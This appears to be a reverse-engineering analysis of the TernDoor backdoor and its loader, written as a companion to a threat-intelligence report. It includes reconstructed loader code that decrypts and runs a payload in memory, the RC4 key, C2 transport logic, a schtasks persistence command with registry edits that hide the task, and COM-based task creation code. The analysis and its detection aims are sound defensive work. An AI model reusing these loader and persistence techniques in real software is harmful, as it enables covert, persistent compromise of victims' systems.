# TernDoor — Reverse Engineering Analysis

**Companion to the TernDoor / UAT-9244 intelligence report.** This document presents the technical reverse engineering behind the report's findings. Reference: https://blog.talosintelligence.com/uat-9244/ · TLP:CLEAR

The analysis covers two artifacts: the **loader** `BugSplatRc64.dll` (analyzed as a PE), and the **backdoor**, recovered from an injected `msiexec.exe` process image and analyzed statically. Offsets prefixed `0x` in the backdoor sections are relative to the recovered implant image; loader offsets are RVAs.

---

## 1. Loader: BugSplatRc64.dll

The loader is a 64-bit DLL with **no exported functions**; its logic runs from `DllMain` when the signed host `wsprint.exe` side-loads it.

### 1.1 API resolution by hash

The loader imports nothing of interest statically. It resolves its Windows APIs **by hash at runtime** through a resolver at RVA **`0x1040`**, walking `kernel32` exports and matching precomputed hashes. Seven APIs are resolved: `GetModuleFileNameW`, `CreateFileW`, `GetFileSize`, `VirtualAlloc`, `ReadFile`, `CloseHandle`, and the payload entry transfer. This defeats static import analysis and IAT-based detection.

### 1.2 Payload location and decryption

The load routine derives the payload path from the host's own path, then decrypts and executes in memory:

```c
// BugSplatRc64.dll — reconstructed load routine
WCHAR path[MAX_PATH];
GetModuleFileNameW(NULL, path, MAX_PATH);     // e.g. ...\WSPrint.exe
replace_extension(path, L"dll");              // -> ...\WSPrint.dll

HANDLE h   = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                         NULL, OPEN_EXISTING, 0, NULL);
DWORD  sz  = GetFileSize(h, NULL);
BYTE  *buf = VirtualAlloc(NULL, 0x100000,     // 1 MB RWX region
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
DWORD  rd;
ReadFile(h, buf, sz, &rd, NULL);

rc4(buf, rd, "qwiozpVngruhg123", 16);         // RC4, first 16 bytes as key
CloseHandle(h);

((void (*)(void))buf)();                       // execute decrypted payload in place
```

Key characteristics:

| Property | Value |
|---|---|
| Decryption | **RC4**, key `qwiozpVngruhg123` (16-byte key) |
| Payload file | `WSPrint.dll`, read from the host directory |
| Memory | `VirtualAlloc(NULL, 0x100000, …, PAGE_EXECUTE_READWRITE)` |
| API resolution | by hash, resolver at RVA `0x1040`, 7 APIs |
| Toolchain | Microsoft Visual C++ 2019 (v16.11), LTCG |
| Packing | none (`.text` entropy ≈ 6.44) |

The decrypted payload is the TernDoor backdoor, which proceeds to drop, persist, and inject into `msiexec.exe`.

---

## 2. String deobfuscation *(previously undocumented)*

TernDoor stores its strings obfuscated and decodes them in memory at runtime. The routine is a **two-pass per-character transform**: an additive-XOR pass with two per-string constants, followed by a **position-keyed pass** driven by an embedded 16-byte table.

### 2.1 Algorithm

```
Pass 1 — additive-XOR (per character, constants K and X from the call site):
    t[i] = ((enc[i] + K) ^ X) - K

Pass 2 — position-keyed (s drawn from the key table by low nibble of the index):
    s        = table[i & 0x0F]
    plain[i] = ((i + s) ^ (s + t[i])) - s
```

`K` and `X` are small per-string constants supplied at each call site; the key table is shared.

### 2.2 Key tables

Two tables are present in the image. The primary table appears **three times** (at offsets `0xC9490`, `0xC9510`, `0xC9538`), stored as **16-bit little-endian** words; a second **byte-stream** variant sits at `0xC9560`.

| Offset(s) | Storage | Bytes (low byte shown for the 16-bit table) | ASCII |
|---|---|---|---|
| `0xC9490`, `0xC9510`, `0xC9538` | 16-bit LE | `6B 6A 6F 62 49 55 62 62 25 38 37 34 35 68 67 55` | `kjobIUbb%8745hgU` |
| `0xC9560` | byte stream | `61 62 67 25 62 59 43 59 48 76 6E 62 25 33 32 34` | `abg%bYCYHvnb%324` |

Raw 16-bit form as it appears on disk/in memory:
`6B 00 6A 00 6F 00 62 00 49 00 55 00 62 00 62 00 25 00 38 00 37 00 34 00 35 00 68 00 67 00 55 00`

### 2.3 Reference implementation

```python
def terndoor_string_deob(enc: bytes, K: int, X: int, table: bytes) -> bytes:
    """Recover a TernDoor string. K and X are the per-string constants
    taken from the call site; `table` is the 16-byte key table."""
    # Pass 1: additive-XOR
    buf = bytearray((((b + K) ^ X) - K) & 0xFF for b in enc)
    # Pass 2: position-keyed
    for i in range(len(buf)):
        s = table[i & 0x0F]
        buf[i] = (((i + s) ^ (s + buf[i])) - s) & 0xFF
    return bytes(buf)

# Primary key table (low bytes of the 16-bit LE table at 0xC9490/0xC9510/0xC9538)
KEY_TABLE = bytes([0x6B,0x6A,0x6F,0x62,0x49,0x55,0x62,0x62,
                   0x25,0x38,0x37,0x34,0x35,0x68,0x67,0x55])
```

Because strings are only plaintext in memory after this routine runs, they are recoverable from a process image of the live backdoor but not from the encrypted on-disk payload. The key tables and RTTI strings are provided as YARA selectors in `detections/yara/terndoor.yar`.

---

## 3. Command-and-control transport factory *(previously undocumented)*

Public reporting describes TernDoor's C2 as HTTP/HTTPS. The backdoor in fact selects among **five transports at runtime** through a **transport factory** at offset **`0x9FD0`**, driven by a **bitmask channel selector** from the decoded configuration.

### 3.1 Factory dispatch

```c
// FUN_00009FD0 — transport factory (reconstructed)
void *make_transport(uint32_t selector, config_t *cfg)
{
    void *obj = NULL;
    if      (selector & 0x01) { obj = operator_new(0x70);  TcpConn_ctor (obj, cfg); }
    else if (selector & 0x04) { obj = operator_new(0x400); proxyA_ctor  (obj, cfg); } // FUN_3050
    else if (selector & 0x08) { obj = operator_new(0x400); proxyB_ctor  (obj, cfg); } // FUN_65E0
    else if (selector & 0x10) { obj = operator_new(0x78);  HttpConn_ctor (obj, cfg); }
    else if (selector & 0x80) { obj = operator_new(0x80);  HttpsConn_ctor(obj, cfg); }
    return obj;
}
```

| Selector bit | Object size | Constructor | Transport |
|---|---|---|---|
| `0x01` | `0x70` | — | direct TCP socket (`TcpConn`) |
| `0x04` | `0x400` | `FUN_3050` | proxy, mode A |
| `0x08` | `0x400` | `FUN_65E0` | proxy, mode B |
| `0x10` | `0x78` | — | HTTP (`HttpConn`) |
| `0x80` | `0x80` | — | HTTPS (`HttpsConn`) |

The two proxy connectors parse a **host-and-port pair** from the configuration. The connection classes are confirmed by RTTI:

| RTTI descriptor | Offset |
|---|---|
| `.?AVHttpConn@@` | `0xE9320` |
| `.?AVHttpsConn@@` | `0xE9360` |
| `.?AVTcpConn@@` | `0xE9438` |

### 3.2 Connection manager and vtable layout

A connection manager at offset **`0x2730`** iterates the transports indicated by the configuration mask and **attempts each until one connects**. Each connection object exposes a uniform vtable; the **connect/open method is at vtable offset `+8`** (index 1) and returns a success/failure status.

```c
// FUN_00002730 — connection manager (reconstructed)
for (each bit set in cfg->transport_mask) {       // 0x01,0x04,0x08,0x10,0x80
    void *t = make_transport(bit, cfg);           // FUN_9FD0
    if (t) {
        status = (*(connect_fn *)(*(void ***)t + 1))(t);  // vtable slot +8
        if (status == SUCCESS)
            return t;
        destroy(t);
    }
}
```

### 3.3 Configuration

TernDoor decodes a configuration structure carrying the **C2 IP address**, the **number of connection retries**, the **C2 port**, and an optional **User-Agent** used by the HTTP-based transports. The configured `transport_mask` selects which of the five channels are attempted and in what precedence.

---

## 4. Persistence

TernDoor implements two task-creation paths plus a registry Run key.

### 4.1 Scheduled task via command line — `FUN_00050CD0`

The handler at offset **`0x50CD0`** deobfuscates the task-creation template (using the key table at `0xC9538`) and executes:

```
schtasks /create /tn WSPrint /tr "C:\ProgramData\WSPrint\WSPrint.exe" /ru "SYSTEM" /sc onstart /F
```

It then **hides the task** by editing the registry under
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\WSPrint` — deleting the `SD` value and setting `Index` to `0` — so the task is not visible to standard enumeration.

### 4.2 Scheduled task via COM API — `FUN_00052330` *(previously undocumented)*

The function at offset **`0x52330`** registers the same persistence through the **Task Scheduler COM interface**, producing a task **without spawning `schtasks.exe`**:

```c
// FUN_00052330 — COM persistence (reconstructed)
CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                 IID_ITaskService, (void **)&pSvc);
pSvc->Connect(vEmpty, vEmpty, vEmpty, vEmpty);
pSvc->GetFolder(L"\\", &pFolder);
pSvc->NewTask(0, &pDef);
//   pDef: RegistrationInfo; Principal (RunLevel = HIGHEST, LogonType);
//         Triggers -> BootTrigger; Actions -> ExecAction(WSPrint.exe)
pFolder->RegisterTaskDefinition(_bstr(L"WSPrint"), pDef,
                                TASK_CREATE_OR_UPDATE, vEmpty, vEmpty,
                                TASK_LOGON_..., vEmpty, &pTask);
```

The error-handling paths reference the Task Scheduler HRESULTs **`0x80070431`**, **`0x80070420`**, and **`0x8007041D`** (`SCHED_E_*`), confirming the `ITaskService` path. This second mechanism creates a scheduled task with **no corresponding `schtasks.exe` execution**, which is the basis for the COM-persistence hunt in `detections/README.md`.

### 4.3 Registry Run key

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Default = C:\ProgramData\WSPrint\WSPrint.exe
```

---

## 5. Installer / orchestrator — `FUN_00052DB0`

The orchestrator at offset **`0x52DB0`** sequences first-run setup: it **drops** the component set to `C:\ProgramData\WSPrint\`, establishes **persistence** (Sections 4.1/4.2), writes the **Run key** (4.3), and **launches** the persisted copy. On subsequent runs the backdoor proceeds to inject into `msiexec.exe`, gated by a self-check that it is executing within `msiexec.exe` before fully unpacking — a behavior inherited from earlier CrowDoor variants.

---

## 6. Kernel driver

TernDoor deploys a kernel-mode driver, **`WSPrint.sys`**, **AES-encrypted within the backdoor's shellcode** and decrypted at deployment. It is installed and started through `OpenSCManagerW` / `CreateServiceW` / `StartServiceW`, and exposes the device **`\Device\VMTool`** (symbolically linked to `\DosDevices\VMTool`). The driver hides implant components and **suspends, resumes, and terminates processes** from kernel space.

---

## 7. Backdoor capabilities (API level)

The capability set is implemented over the following Windows APIs recovered from the implant image:

| Capability | APIs |
|---|---|
| Command execution / remote shell | `CreateProcessW/A`, `CreateProcessAsUserW`, `ShellExecuteW` |
| Process control | `TerminateProcess` |
| File operations | `ReadFile`, `WriteFile` |
| System reconnaissance | `GetComputerNameW`, `GetUserNameW` |
| Service / driver deployment | `OpenSCManagerW`, `CreateServiceW`, `StartServiceW` |

The numeric command identifiers that map C2 opcodes to these handlers differ from those of earlier CrowDoor variants and are dispatched through a runtime-resolved virtual table.

---

## 8. Function and offset reference

Offsets are relative to the recovered implant image (loader entries are RVAs).

| Offset | Symbol | Purpose |
|---|---|---|
| RVA `0x1040` | API hash resolver (loader) | resolves 7 kernel32 APIs by hash |
| `0x9FD0` | `FUN_00009FD0` | C2 transport factory (5-mode bitmask dispatch) |
| `0x2730` | `FUN_00002730` | connection manager (sequential transport attempts) |
| `0x3050` | `FUN_00003050` | proxy connector, mode A (`selector & 0x04`) |
| `0x65E0` | `FUN_000065E0` | proxy connector, mode B (`selector & 0x08`) |
| `0x50CD0` | `FUN_00050CD0` | persistence via `schtasks.exe` + task hiding |
| `0x52330` | `FUN_00052330` | persistence via `ITaskService` COM API |
| `0x52DB0` | `FUN_00052DB0` | installer / orchestrator (drop, persist, launch) |
| `0xC9490` / `0xC9510` / `0xC9538` | key table (16-bit LE) | string-deobfuscation key material |
| `0xC9560` | key table (byte stream) | string-deobfuscation key material (variant) |
| `0xE9320` / `0xE9360` / `0xE9438` | RTTI | `HttpConn` / `HttpsConn` / `TcpConn` |

---

## Appendix: indicators

A complete indicator set, including the string-deobfuscation key tables, RTTI selectors, and the transport bitmask, is in `iocs/iocs.md`. Detection content built on this analysis is in `detections/`.
